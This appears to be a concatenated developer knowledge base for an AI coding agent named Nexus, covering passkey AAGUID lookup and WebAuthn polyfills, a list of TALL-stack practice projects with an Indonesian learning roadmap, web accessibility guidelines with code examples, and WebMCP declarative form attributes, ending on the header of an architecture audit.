Before looking up the AAGUID in the registry, check if it equals `'00000000-0000-0000-0000-000000000000'`. If so, skip the registry lookup and set `name` to a fallback (e.g. device name from user-agent, or "Unknown passkey provider") and `providerIcon` to `undefined`. Only look up the registry for non-zeroed AAGUIDs.

```javascript
import aaguids from './aaguids.json' with { type: 'json' };

const { aaguid } = registrationInfo;
if (aaguid === '00000000-0000-0000-0000-000000000000') {
  // use the device name as the passkey provider based on
  // the information derived from the user agent string,
  // or just say "Unknown passkey provider"
} else {
  const provider = aaguids[aaguid];
  const credential = {
    // ...other fields
    aaguid,
    name: provider?.name || 'Unknown passkey provider',
    providerIcon: provider?.icon_light,
  };
}
```

## Fallback Strategies

### Passkey feature detection fallback

Baseline status for the api.PublicKeyCredential.getClientCapabilities_static capability: Newly available. It's been Baseline since 2025-02-06.
Supported by: Chrome 133 (Feb 2025), Edge 133 (Feb 2025), Firefox 135 (Feb 2025), and Safari 17.4 (Mar 2024).

Always install 'webauthn-polyfills' and import it in the context.
Consider as long as  `PublicKeyCredential` is supported, `PublicKeyCredential.getClientCapabilities` is also supported. 

```js 
import 'webauthn-polyfills';
``` 

### Signal API Synchronization Fallback

Web authentication signal methods has limited availability.
Supported by: Chrome 132 (Jan 2025), Edge 132 (Jan 2025), and Safari 26 (Sep 2025).
Unsupported in: Firefox.
If the browser does not support `PublicKeyCredential.parseRequestOptionsFromJSON`, use the 'webauthn-polyfills': 
  
```html 
<script type="module"> 
  if (!PublicKeyCredential.parseRequestOptionsFromJSON) { 
     await import('https://unpkg.com/webauthn-polyfills'); 
   } 
 </script> 
 ``` 

This will also add support for `PublicKeyCredential.prototype.toJSON`.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [determine the passkey provider from aaguid, security, database, ui-ux, tdd, api]

### 📘 KNOWLEDGE: NEXUS_100 PROJECT TEST TALL STACK.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## 1. Fundamental CRUD & Auth Projects [Tags: crud, auth, basic, phase-1]
   Todo App realtime
   Notes App dengan tagging
   Bookmark manager
   Habit tracker
   Expense tracker pribadi
   Daily journal app
   Contact manager
   Password manager UI
   URL shortener
   Personal portfolio CMS
## 2. Dashboard & Admin Panel [Tags: dashboard, admin, analytics, phase-1]
   Admin dashboard analytics
   User management system
   Role & permission manager
   Audit log dashboard
   System monitoring dashboard
   Inventory dashboard
   Multi-tenant admin panel
   Subscription management dashboard
   CRM sederhana
   ERP mini system
## 3. Authentication & Security Focus [Tags: security, auth, oauth, phase-2]
   2FA authentication system
   OAuth login integration
   Magic link authentication
   Session management dashboard
   API token manager
   Device activity tracker
   Login anomaly detector
   Email verification workflow
   Password reset flow custom
   Secure file vault
## 4. Realtime & Livewire Intensive [Tags: realtime, livewire, websocket, phase-2]
   Live chat application
   Realtime notification center
   Collaborative notes app
   Multiplayer quiz app
   Live polling system
   Realtime kanban board
   Customer support dashboard
   Stock monitoring dashboard
   Realtime queue monitor
   Live auction platform
## 5. SaaS-Oriented Projects [Tags: saas, billing, multi-tenant, phase-3]
   Invoice SaaS
   Subscription billing platform
   Project management SaaS
   Team collaboration app
   Time tracking SaaS
   Appointment booking SaaS
   Social media scheduler
   File sharing SaaS
   Resume builder SaaS
   Form builder SaaS
## 6. E-Commerce Systems [Tags: ecommerce, marketplace, pos, phase-3]
   Toko online lengkap
   Multi-vendor marketplace
   POS system
   Digital product marketplace
   Food ordering app
   Flash sale platform
   Membership ecommerce
   Dropshipping dashboard
   Affiliate tracking system
   Warehouse management app
## 7. Advanced Livewire Components [Tags: ui, components, alpine, phase-2]
   Drag-and-drop page builder
   Kanban drag-and-drop
   Dynamic form generator
   Reusable datatable package
   Nested comments system
   Dynamic filtering engine
   Realtime search engine
   Infinite scrolling feed
   Media uploader with preview
   Spreadsheet-like editor
## 8. API & Integration Heavy [Tags: api, integration, webhooks, phase-3]
   Payment gateway integration platform
   Email campaign manager
   WhatsApp gateway dashboard
   SMS broadcast platform
   Weather dashboard API
   Cryptocurrency tracker
   AI chatbot dashboard
   OpenAI content generator
   Social media analytics aggregator
   Logistics tracking system
## 9. Enterprise-Level Architectures [Tags: enterprise, hr, school, hospital, phase-4]
   HR management system
   School management system
   Hospital management system
   Manufacturing workflow app
   Procurement management app
   Legal document workflow
   Enterprise approval workflow
   Internal ticketing system
   Corporate knowledge base
   Enterprise document management
## 10. Expert-Level TALL Stack Challenges [Tags: expert, architecture, ddd, event-sourcing, phase-4]
    Multi-tenant SaaS architecture
    Event sourcing implementation
    CQRS dashboard system
    Laravel package generator
    Custom Livewire component library
    Full websocket collaboration suite
    Headless CMS with Livewire admin
    Workflow automation engine
    Visual automation builder
    AI-powered productivity platform

Roadmap Penguasaan TALL Stack

Kalau tujuanmu menjadi “master”, urutan pengerjaan project sangat penting.

Phase 1 — Fundamental Laravel + Livewire

Kerjakan:

1–10
Fokus:
CRUD
validation
authentication
migrations
Eloquent
Blade
Livewire basic state
Phase 2 — Intermediate Reactive UI

Kerjakan:

31–40
61–70
Fokus:
Livewire lifecycle
Alpine interop
realtime UX
event system
reusable components
optimization
Phase 3 — SaaS & Business Logic

Kerjakan:

41–60
Fokus:
subscription
payment
queues
notifications
policies
caching
scaling
Phase 4 — Enterprise Architecture

Kerjakan:

81–100
Fokus:
multi-tenancy
DDD
CQRS
event sourcing
websocket
testing strategy
CI/CD
deployment
observability

Stack Tambahan yang Sangat Direkomendasikan

Backend
Laravel Horizon
Laravel Reverb
Redis
Meilisearch
Elasticsearch
Frontend
Alpine Persist
Alpine Morph
Flux UI / Volt
Infra
Docker
Nginx
CI/CD GitHub Actions
VPS deployment
S3 object storage
Testing
Pest PHP
Laravel Dusk
---

## 🤖 Nexus Project Selection Protocol
Untuk memulai simulasi mandiri (Recursive Evolution), Nexus Agent harus mengikuti langkah berikut:
1. **Target Identification**: Pilih nomor proyek dari daftar di atas berdasarkan Phase yang sedang diuji.
2. **Tag Matching**: Pastikan `EvolutionPiper.js` memiliki template scenario yang cocok dengan `[Tags]` kategori tersebut.
3. **Sandbox Spawning**: Jalankan perintah `piper.spawnSandbox(project_name, tags)` untuk membuat lab pengujian.
4. **Learning Absorption**: Setelah siklus selesai, gunakan `Distiller` untuk menyerap pola kode TALL Stack yang berhasil diimplementasikan ke dalam HUB Utama.

> **Status**: Machine-Readable | **Last Ingested**: 10/05/2026


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_ACCESSIBILITY.MD

# Accessibility Coding Guidelines
> **VERSION**: v1 | **Last Updated**: 26/05/2026



This guide provides actionable DOs and DON'Ts for AI coding agents to ensure web applications are accessible to all users, including those using assistive technologies.

Keep these principles in mind throughout:

- **Accessibility is the minimum, not the ceiling.** Conformance to standards is the floor; aim for genuine usability.
- **Patterns are use-case specific.** No checklist replaces real testing — including testing with disabled users — to confirm a given implementation is actually accessible in context.

## 1. Content Navigability and Structure

### Actionable Guidelines

#### DOs
- **Place all content within landmarks**: Wrap the page in `<header>`, `<nav>`, `<main>`, `<aside>`, and `<footer>` so assistive-tech users can jump between regions.
- **Structure main content with headings**: Use `<h1>`–`<h6>` sequentially (no jumping `<h1>` → `<h4>`) so screen-reader users get a navigable outline.
- **Use lists for repeated, contiguous content**: `<ul>`/`<ol>` give assistive tech a count up front and let users skip the entire group.
- **Provide skip links** prior to repeated content like site headers with navigation or long/infinite lists, so that keyboard users can easily bypass them. Make sure the target is focusable (e.g. `<main id="content" tabindex="-1">`).
- **Semantic Tables**: Use `<caption>` and `<th scope="col">` (or `<th scope="row">`) for data tables.

#### DON'Ts
- **Don't use fake headings**: Never style `<div>` or `<span>` to look like headings without standard `<h1>`–`<h6>` tags.
- **Don't place headings inside `<summary>`, and avoid relying on headings inside `<details>` content**: Headings inside `<summary>` may be hidden from screen-reader heading lists and heading-navigation shortcuts entirely; headings inside `<details>` content are only reachable via heading navigation when the disclosure is open.
  - **Caveat**: If a heading must act as a disclosure trigger, use a more robust alternative to `<details>`/`<summary>` instead, e.g. an accordion or a disclosure implemented with ARIA where the heading wraps the button.
- **Don't use tables for layout**: Use CSS Grid/Flexbox for visual layouts.
- **Don't overuse landmarks**: Too many landmarks dilute their value. In particular, avoid labeling a `<section>` (which turns it into a `region` landmark) — `region` should be a last resort when no other landmark fits.

### Code Examples

```html
<!-- Good: Semantic landmarks, heading hierarchy, skip link -->
<header>
  <a href="#content" class="skip-link visually-hidden">Skip to content</a>
  <nav aria-label="Primary">
    <ul>
      <li><a href="/">Home</a></li>
    </ul>
  </nav>
</header>
<main id="content" tabindex="-1">
  <h1>Platform Dashboard</h1>
  <section>
    <h2>User Statistics</h2>
    <table>
      <caption>Monthly active users</caption>
      <tr>
        <th scope="col">Month</th>
        <th scope="col">Users</th>
      </tr>
      <tr>
        <td>January</td>
        <td>12,000</td>
      </tr>
    </table>
  </section>
</main>
```

## 2. Semantic HTML and ARIA

### Actionable Guidelines

#### DOs
- **Prefer HTML elements and attributes to ARIA**: A native element comes with the right role and behavior. `<button>` already implies `role="button"`; `required` already implies `aria-required`.
- **Match ARIA implementations to actual behavior**: If you set `role="tab"`, the element must behave like a tab — including keyboard interactions. Many ARIA patterns can't be implemented in CSS alone and need JavaScript.
- **Be deliberate about `disabled` vs `aria-disabled`**: `disabled` removes the element from the focus order entirely (and `tabindex="0"` won't bring it back), which is often wrong for toolbar buttons or links. `aria-disabled="true"` keeps the element focusable so users can land on it and learn it's disabled.

#### DON'Ts
- **Don't use ARIA when native HTML exists**: Avoid `<div role="button">` or `<a role="button">` if `<button>` works.
- **Don't add redundant ARIA roles or properties**: Avoid `<ul role="list">`, `<nav role="navigation">`, or `<input required aria-required="true">`.
  - **Caveat**: Safari removes list semantics from `<ul>`/`<ol>` outside `<nav>` when `list-style: none` or `display: flex`/`grid` is applied. In that case `role="list"` is required to restore them.
- **Don't assume custom elements have no ARIA**: Custom elements can attach ARIA via `ElementInternals`, which some automated test tools can't see — so the absence of `role`/`aria-*` attributes in markup doesn't prove the element has no semantics. Verify with the browser's accessibility-tree inspector.

## 3. Accessible Names and Descriptions

Every interactive element and some landmarks need an accessible name, and many benefit from an accessible description. Names are short and identify the element; descriptions add context.

### Actionable Guidelines

#### DOs
- **Prefer native naming mechanisms**: `<label>` for form controls, `<caption>` for `<table>`, `<legend>` for `<fieldset>`, `<figcaption>` for `<figure>`.
- **Explicitly associate `<label>` with its control via `for`/`id`**, even when nesting the input inside the label — explicit association improves assistive-tech support.
- **Prefer `aria-labelledby` over `aria-label` when a visible label exists**: avoids duplication, improves maintainability, and translates better.
- **Prefer to reuse the same accessible name for hyperlinks that share an `href`.**
- **Use visually hidden text to disambiguate controls** that look identical visually but do different things (e.g. multiple "Edit" buttons in a list).

#### DON'Ts
- **Don't put `aria-label`/`aria-labelledby` on elements that shouldn't be named** — e.g. plain `<div>`, `<span>`, or custom elements without a role. Custom elements may have an implicit role set via `ElementInternals`, so the absence of a `role` attribute isn't conclusive.
- **Don't reuse an accessible name across controls with different effects in the same view** (close buttons for two different open dialogs are fine because only one is reachable at a time; multiple “Edit” buttons for different content is not).
- **Don't reuse an accessible name across hyperlinks pointing to different `href`s.**
- **Don't pack descriptions, error messages, or instructions into the label.**
- **Don't repeat state already exposed via ARIA** (`aria-expanded`, `aria-checked`, `aria-selected`, `aria-pressed`) inside the accessible name — it creates redundancy and ambiguity.
- **Don't include the role name in the label**: `<nav aria-label="Primary navigation">` reads as "Primary navigation navigation."
- **Don't use `title` or `placeholder` as a naming mechanism.**
- **Don't include interactive elements in an `aria-describedby` target** unless their text content reads sensibly as a description on its own (e.g. if a link’s text is the same as how it’s labelled elsewhere, it can be included within a description).

### Code Example: Visually Hidden Utility

A `.visually-hidden` utility lets you provide text for screen readers without rendering it visually. It's commonly used for skip links, additional context on icon-only buttons, and supplementary labels.

```css
/* Hides content visually but keeps it in the accessibility tree.
   :focus-within / :active opt elements out — useful for skip links and
   any focusable content wrapped in this class. */
.visually-hidden:where(:not(:focus-within, :active)) {
  position: absolute !important;
  clip-path: inset(50%) !important;
  overflow: hidden !important;
  width: 1px !important;
  height: 1px !important;
  margin: -1px !important;
  padding: 0 !important;
  border: 0 !important;
  white-space: nowrap !important;
}
```

When the hidden content is focusable (skip links, focus-receiving wrappers), the `:focus-within`/`:active` exception lets it become visible. Style the visible state per situation, e.g. a skip link to the main content typically wants fixed positioning at the top-left of the viewport so the rest of the page doesn't shift.

## 4. Document Metadata and Language

### Actionable Guidelines

#### DOs
- **Declare Visual Language**: Always set `<html lang="en">` (or appropriate code).
- **Unique Page Titles**: Front-load unique context in `<title>` (e.g., `Page Topic | Site Name`).
- **Inline Language Switches**: Use `lang="..."` for block quotes or text in different languages.
- **IFrame Titles**: Always provide a descriptive `title="..."` for `<iframe>` elements.
- **Update document title on Page Transitions in SPAs**: Shift focus to updated titles.

#### DON'Ts
- **Don't Disable iframe Scrolling**: Avoid `scrolling="no"` (deprecated) or `overflow: hidden` on iframes. Users who zoom in or enlarge text need to scroll to reach content that overflows.

### Code Examples

```html
<!-- Good: Distinct title and language declaration -->
<html lang="en">
<head>
  <title>Analytics Reports | Guidance Platform</title>
</head>
<body>
  <p>The motto is <span lang="la">"Carpe diem"</span>.</p>
  <iframe title="Interactive Sales Chart" src="/chart"></iframe>
</body>
</html>
```

## 5. Keyboard and Focus Management

### Actionable Guidelines

#### DOs
- **Logical Tab Order**: Ensure tab order matches visual layouts (top-to-bottom).
- **Visible Focus Indicators**: Always style `:focus-visible` states explicitly. If disabling defaults, provide overrides with sufficient contrast.
- **Custom Trigger Keyboards**: Attach Enter/Space handlers for custom simulated interactive elements. When implementing a custom keyboard handler for button-like elements, `Enter` should be a `keydown` handler and `Space` should be a `keyup` handler (matching native `<button>` behavior where `Enter` repeats and `Space` triggers on release).
- **Use `tabindex` deliberately**: Anything focusable — by keyboard or programmatically — should have an implicit or explicit ARIA role, so don't make every element focusable. When focus is needed, choose `tabindex="0"` to add the element to the tab order or `tabindex="-1"` to make it programmatically focusable only (e.g., a skip-link target).
- **Manage Toggle States**: Utilize `aria-expanded` and `aria-pressed` to communicate toggle states for custom controls.

#### DON'Ts
- **Don't disable outlines without replacements**: Avoid `outline: none` without styling alternatives.
- **Don't use Positive Tabindex values**: Never use `tabindex="1"` or greater.
- **Don't hide interactive elements from screen readers**: Avoid `aria-hidden="true"` or `role="presentation"` on elements that can receive focus.

### Code Examples

```css
/* Good: High contrast focus border */
:where(a:any-link, button):focus-visible {
  outline: 3px solid #ff0055;
  outline-offset: 3px;
}
```

```html
<!-- Good: Skip to main content -->
<a href="#content" class="skip-link">Skip to main content</a>
<main id="content" tabindex="-1">...</main>
```

```javascript
// Good: Keyboard handlers for complex custom widgets (e.g., Tree items, tabs).
// NOTE: This pattern applies ONLY to non-standard UI where no native HTML tag exists.
// Always prioritize native <button> or <input> elements for standard interactions.
// Elements MUST have the appropriate ARIA role (e.g., role="treeitem" or role="tab").
customWidget.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    toggleWidgetState();
  }
  if (e.key === ' ') {
    e.preventDefault(); // Prevent page scrolling on Spacebar keydown
  }
});

customWidget.addEventListener('keyup', (e) => {
  if (e.key === ' ') {
    toggleWidgetState();
  }
});

function toggleWidgetState() {
  // E.g., Manage toggle/expanded states for custom controls
  const isExpanded = customWidget.getAttribute('aria-expanded') === 'true';
  customWidget.setAttribute('aria-expanded', !isExpanded);
}
```

## 6. Alternate Text and Media

### Actionable Guidelines

#### DOs
- **Informative Visual Descriptions**: Describe the purpose of the image (e.g., "Search", not "Magnifying glass").
- **Empty Alt properties for decorative visuals**: Use `alt=""` to remove decorative images from the accessibility tree so they aren't announced.
- **Synchronous Captions for videos**: Supply WebVTT captions for video tracks.
- **Transcripts for audio**: Provide text transcripts for purely audio podcasts.
- **Informative View Descriptions for inline SVGs**: Apply `role="img"` and a nested `<title>` tag for informative visuals.
- **Decorative SVGs removal**: Apply `aria-hidden="true"` to remove decorative SVGs from reading flows.
- **Long descriptions for complex images**: Use `<figure>`/`<figcaption>` or `aria-describedby` for charts and infographics.
- **Provide data tables as alternatives**: Consider providing semantic data tables as accessible alternatives for charts and other complex data visualizations.

#### DON'Ts
- **Don't use clichéd prefixes**: Avoid "Image of..." or "Picture of...".
- **Don't use underscores in filenames**: Use dashes if the filename might be announced as fallback.

### Code Examples

```html
<!-- Decorative -->
<img src="divider.png" alt="">

<!-- Inline Decorative SVG (remove from tab flow) -->
<svg aria-hidden="true" viewBox="0 0 24 24">
  <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/>
</svg>

<!-- Informative (Functional) -->
<a href="/search">
  <img src="glass.png" alt="Search the platform">
</a>

<!-- Video with Captions tracks -->
<video controls>
  <source src="intro.mp4" type="video/mp4">
  <track src="caps.vtt" kind="captions" srclang="en" label="English">
</video>

<!-- Complex graph with figcaption -->
<figure>
  <img src="chart.png" alt="Sales growth graph 2024.">
  <figcaption>Sales grew 20% in Q3 due to new platform launch.</figcaption>
</figure>

<!-- Audio with expandable transcript details -->
<audio controls src="podcast.mp3" aria-details="podcast-transcript"></audio>
<details id="podcast-transcript">
  <summary>View Transcript</summary>
  <div class="transcript-content">
    Welcome to the show...
  </div>
</details>
```

### Content Visibility Decision Matrix

| Intent | Visual | Screen Reader | Focusable | Structural Pattern |
| :--- | :--- | :--- | :--- | :--- |
| **Visible to all** | Yes | Yes | Yes | Standard rendering |
| **Screen Reader only** | No | Yes | Yes (if interactive) | Visually hidden utility (e.g. `.visually-hidden`) |
| **Visual only** | Yes | No | No | `aria-hidden="true"` / `role="presentation"` |
| **Hidden for all** | No | No | No | `hidden` attribute / `display: none` |

**Heuristic Rule**: If an element can receive keyboard focus, it must not be hidden via `aria-hidden="true"`.

## 7. Forms and Input Controls

### Actionable Guidelines

#### DOs
- **Connect Labels Programmatically**: Use `<label for="id">` linked to `<input id="id">`.
- **Use Autocomplete**: Set valid standard `autocomplete` options (e.g., `"email"` or `"given-name"`) for user profiles.
- **Link hints to inputs via `aria-describedby`**: Associate help text with inputs, and place the hint above the input so autocomplete popovers don't cover it during editing.
- **Announce dynamic errors via live regions**: Use `aria-live` or shift focus to error lists.
- **Provide form validation constraints**: Use `required` (or `aria-required="true"` only when `required` isn't applicable) to signal mandatory inputs.

#### DON'Ts
- **Don't use placeholders as labels**: Placeholders are not persistent labels.
- **Don't trigger context shifts on focus changes**: Avoid auto-submitting forms or jumping pages on focus change events alone.

### Code Examples

```html
<!-- Good: Semantic forms with hints for passwords -->
<form>
  <label for="pwd">Password:</label>
  <span id="pwd-hint">Must contain at least 8 characters.</span>
  <input id="pwd" type="password" aria-describedby="pwd-hint" autocomplete="current-password" required>
</form>
```

## 8. Live Regions

Live regions let assistive tech announce content updates that aren't tied to navigation or focus changes. They're easy to misuse — too many regions, or noisy ones, quickly become spam for screen-reader users.

### Live Region Urgency Table

| Urgency | Visual Analogue | `aria-live` Value | Behavioral Impact | Example |
| :--- | :--- | :--- | :--- | :--- |
| **Critical** | Modal / Alert | `assertive` (or `role="alert"`) | Interrupts immediately, clears speech queue | Session timeout, API failure |
| **Standard**| Toast / Banner | `polite` | Announces at next graceful break | Search results, "Saved" status |
| **Passive**  | Silent text | `off` | Only if user navigates to it | Live character count |

**Heuristic Rule**: Use `assertive` only for critical, time-sensitive updates that require immediate attention or prevent safe continuation (e.g., data loss, session timeouts, or network drops).

### Actionable Guidelines

#### DOs
- **Centralize live regions for non-visible announcements**: A single `polite` region and a single `assertive` region per page (with whatever `aria-atomic` configuration you need) keeps announcements consistent and easier to maintain. Many frameworks ship their own announcer abstraction — use it.
- **Debounce frequently-changing regions**: If a region can update many times per second (e.g. a combobox's result count as the user types), debounce so users aren't spammed.
- **Delay slightly when other announcements may collide**: When the user is typing or focus is being managed, a small delay before announcing keeps live-region updates from overlapping other speech.

#### DON'Ts
- **Don't use live regions for interstitial states** like "Loading…" or "Updating…" unless they're meaningfully informative — they usually just create noise.
- **Don't add live-region updates to inert DOM**: When dialogs open or sections become `inert`, queued or debounced messages can end up unannounced — or announced from DOM the user can't reach. Coordinate live-region updates with dialog/inert state changes.

### Code Example

```html
<!-- Session Timeout Warning with controls -->
<div role="alert" aria-live="assertive" class="timeout-warning">
  Your session will expire in 2 minutes. 
  <button onclick="extendSession()">Extend Session</button>
</div>
```

## 9. Color, Contrast, and Typography

### Actionable Guidelines

#### DOs
- **Minimum contrast standards**: Maintain 4.5:1 for normal text and 3:1 for large text or icons.
- **Ensure non-text contrast standards**: Maintain a minimum contrast ratio of 3:1 for user interface component boundaries and states.
  - This includes visual elements (borders, backgrounds, box-shadows, underlines) that form the boundary or indicate the presence of a UI component (e.g., input field borders).
  - This also includes visual elements indicating active states within a component (e.g., checkbox checkmarks or switch thumbs).
  - **Caveat**: Meeting 3:1 non-text contrast can challenge minimalistic designs. Soft gradients or subtle inset/outset shadows can soften visual boundaries while satisfying accessibility requirements.
- **Use multiple state indicators**: Do not denote success/errors ONLY with color. Use icons or text.
- **Relative font size units**: Use `rem` or `em` for font sizes instead of `px`.
- **Consistent or Start alignment**: Avoid `justify` alignment as it can be more difficult to read.
- **Avoid long lines of text**: Cap paragraph blocks to a maximum of 80 characters width.
- **Support user zoom preferences**: Allow users to resize text up to 200% without loss of content or functionality.
- **Support light and dark color schemes**: Honor `@media (prefers-color-scheme: dark)` and pair it with the `color-scheme` CSS property so form controls, scrollbars, and other UA-rendered surfaces match.
- **Use `prefers-contrast` only when warranted**: Reach for `@media (prefers-contrast: more)` when the design uses low-contrast accents (e.g., subtle borders, muted secondary text) that need to be reinforced; most sites that already meet baseline contrast won't need it.

#### DON'Ts
- **Don't use color alone to indicate the presence of a user interface component or its state**: Use iconography and/or shape to help differentiate.
- **Don't use Justified Text Alignment**: Avoid `text-align: justify`.
- **Don't use Ornate fonts**: Omit cursive typefaces for main reading content.
- **Don't rely on all-caps for emphasis**: Prefer bolding for visual emphasis, and use `<em>`/`<strong>` when the emphasis is semantic.
- **Limit emphasis overall**: Emphasis loses meaning when it's everywhere — apply it only where it changes how the content should be read.

### Code Examples

```css
/* Good: Relative sizing and line caps */
body {
  line-height: 1.5;
  text-align: start; /* Supports LTR and RTL */
}
article {
  max-width: 80ch; /* Caps line length to ~80 characters for readability */
}
```

```html
<!-- Good: Denotes state without colors alone -->
<div class="error-msg">
  <span aria-hidden="true">❌</span>
  <span>The password entered was invalid.</span>
</div>
```

```css
/* Dark Mode support variables */
:root {
  --bg-color: #ffffff;
  --text-color: #212529;
}
@media (prefers-color-scheme: dark) {
  :root {
    --bg-color: #121212;
    --text-color: #f8f9fa;
  }
}
```

## 10. Motions and Preferences

### Actionable Guidelines

#### DOs
- **Support Reduced Motion media queries**: Support `@media (prefers-reduced-motion: reduce)` media queries.
- **Provide Pause mechanism**: Allow users to stop auto-running carousels banners or other persistent animations.
- **Default to static views**: Consider defaulting to static states and allowing users to opt-in to motion.

#### DON'Ts
- **Don't exceed flash limits (three per second)**: Never include rapid light-to-dark flashing. Such effects can cause seizures.

### Code Examples

```css
/* Good: Dampen spin states for reduced motion queries */
@media (prefers-reduced-motion: reduce) {
  .spinner {
    animation: none;
    opacity: 0.5;
  }
}
```

## 11. Modals and Native Dialogs

Modern browsers provide native solutions for creating modal dialogs which avoid the need for focus traps, managing the accessibility of outside content, ensuring the content is on top, and dimming the background content — all of which can be error prone and require heavy JavaScript event tracking to maintain.

### Actionable Guidelines

#### DOs
- **Use the Native `<dialog>` Element**: Invoke the dialog using the `.showModal()` method to open it in a modal state. When in a modal state, the browser sets outside content as inert (i.e. the outside content is hidden from the accessibility tree and cannot be interacted with nor be focused).
- **Use the `inert` Attribute for Custom Overlays**: When `<dialog>` cannot be used (e.g., some non-modal overlays, framework constraints, or layouts where `<dialog>`'s top-layer/positioning behavior conflicts with the design), apply `inert` to outside content to ensure it cannot be interacted with by keyboard, pointer, or assistive technology. This requires structuring elements in such a way that the custom overlay is not a descendant of the element with `inert` set on it.

#### DON'Ts
- **Don't implement focus traps for native modal dialogs**: When a `<dialog>` element is opened in a modal state, browsers set outside content as inert which is sufficient for ensuring only the dialog’s content can be focused.

### Code Examples

**HTML & JS: Native `<dialog>` with standard close events**
```html
<!-- Dialog opens natively with showModal() and locks focus -->
<button id="open-btn">Open Dialog</button>

<dialog id="accessible-modal" aria-labelledby="title-id">
  <h2 id="title-id">Account Settings</h2>
  <p>Update your details here.</p>
  <button onclick="this.closest('dialog').close()">Close Dialog</button>
</dialog>

<script>
  document.getElementById('open-btn').addEventListener('click', () => {
    document.getElementById('accessible-modal').showModal();
  });
</script>
```

## 12. Testing Validations

### Actionable Guidelines

#### DOs
- **Run Automated checks via axe-core or Lighthouse audits**: Catch missing alt texts or low contrasts (e.g., via Lighthouse in Chrome DevTools MCP).
- **Validate Sequential Navigations using keyboards alone**: Using only keyboard shortcuts, such as Tab/Shift+Tab, arrow keys, Enter, Space, and Esc, confirm every interactive element is reachable and operable, and that focus never gets stuck.
- **Test on Screen Readers with calibrated browsers**: Rely on standard bindings (e.g., JAWS with Chrome, NVDA with Firefox, Narrator with Edge, VoiceOver with Safari on macOS and iOS, TalkBack with Chrome for Android).

#### DON'Ts
- **Don't rely purely on scores**: A 100% score does not guarantee real usability.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, performance, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_AGENTIC-FORMS.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

The Declarative API transforms standard HTML `<form>` elements into WebMCP tools via attributes. The browser synthesizes a JSON Schema from the form inputs and handles agent interactions.

## Form Attributes

*   `toolname`: Unique name for the tool.
*   `tooldescription`: Purpose of the tool.
*   `toolautosubmit`: (Optional) If present, the agent can submit the form without waiting for user interaction. 
*   `toolparamdescription`: (Optional) Provides a way to define a property description within the JSON Schema.
    *   **Resolution Order**: The browser uses `toolparamdescription` if present. In its absence, it uses the `textContent` of the associated `<label>` (skipping labelable descendants). If no label exists, it falls back to the `aria-description`.
    *   **Grouping (Fieldsets)**: To attach a description to a group of related elements (like `<input type="radio">` buttons), place `toolparamdescription` on the nearest parent `<fieldset>` element so it applies to the parameter group as a whole.

### Example

```html
<form toolname="search-cars" 
      tooldescription="Perform a car make/model search" 
      toolautosubmit>
  <label for="make">Vehicle Make</label>
  <input type="text" id="make" name="make" required>
  
  <label for="model">Vehicle Model</label>
  <input type="text" id="model" name="model" toolparamdescription="e.g., 330i, F-150" required>
  
  <button type="submit">Search</button>
</form>
```

## Handling Submissions in JavaScript

When an agent submits the form, the `SubmitEvent` includes `agentInvoked` (boolean) and `respondWith(promise)`.

```javascript
document.querySelector('form').addEventListener('submit', (event) => {
  event.preventDefault();

  // Validate the form
  const formValidationErrors = myFormIsValid();

  if (formValidationErrors.length > 0) {
    if (event.agentInvoked) {
      const errorString =
        'Validation failed: ' +
        formValidationErrors
          .map((err) => `${err.field} (${err.message})`)
          .join(', ');

      event.respondWith(Promise.resolve(errorString));
    }
    return;
  }

  const resultPromise = performAsyncSearch(new FormData(event.target));

  // Return the result directly to the agent without navigation
  if (event.agentInvoked) {
    event.respondWith(resultPromise);
  }
});
```

## Lifecycle Events

The window emits events when agents start or stop interacting with a tool:

```javascript
window.addEventListener('toolactivated', ({ toolName }) => {
  console.log(`Tool "${toolName}" was activated by the agent.`);
});

window.addEventListener('toolcancel', ({ toolName }) => {
  console.log(`Tool "${toolName}" interaction was cancelled.`);
});
```

## Visual Feedback (CSS)

Use pseudo-classes to highlight forms when an agent interacts with them:

*   `:tool-form-active`: Applied to the `<form>` element actively used by the agent.
*   `:tool-submit-active`: Applied to the submit button when the browser pauses for user review (if `toolautosubmit` is omitted).

```css
form:tool-form-active {
  outline: 2px dashed blue;
  background-color: rgba(0, 0, 255, 0.05);
}

button:tool-submit-active {
  outline: 2px dashed red;
  animation: pulse 2s infinite;
}
```

## Form Suitability (When to Avoid)

The Declarative API is best for self-contained, standard forms. It is a poor choice in these scenarios:

* **Highly Dependent Fields**: Forms where inputs change options or visibility based on other inputs. The synthesized schema cannot express these dependencies well.
* **Custom UI Components**: Forms relying on non-standard inputs (e.g., canvas, rich text editors) that don't auto-serialize values.
* **Multi-Step Wizards**: Complex workflows requiring multiple form submissions. The Imperative API or standard DOM interaction is better suited here.

## When to use toolautosubmit
* **Read-Only Operations & Queries**: Searches, filters, fetching details, or checking status (e.g., a car model search, searching a directory, checking stock availability).
* **Low-Risk, Reversible Actions**: Form actions that can easily be undone or refined by the user manually (e.g., adding items to a cart, applying a coupon code, saving a draft, or setting temporary layout options).

## When to omit toolautosubmit
* **Destructive or Irreversible Actions**: Deleting records, resetting system configurations, or clearing databases.
* **Financial & Transactional Actions**: Submitting a checkout form, transferring funds, authorizing subscription payments, or final order placements.
* **High-Impact User Communication**: Submitting a final job application, sending emails/messages to other real users, or publishing public-facing content.
* **Sensitive Account Settings**: Changing passwords, modifying user roles/permissions, or updating billing/profile info.

## Fallback strategies

Form-associated WebMCP attributes is not natively supported by any major browser yet.

The WebMCP Declarative API is safe to use in all browsers. Browsers that do not support WebMCP will ignore the `tool*` attributes, and the `<form>` will continue to function as a normal HTML form. No feature detection is required.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, saas, api]

### 📘 KNOWLEDGE: NEXUS_AI_ARCHITECTURE_ANALYSIS.MD

# NEXUS AI — Analisis Arsitektur & Audit Pipeline Sandbox
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Versi Dokumen:** 1.0  
**Tanggal:** 18 Mei 2026  
**Scope:** Full architecture review + extreme sandbox pipeline inspection  
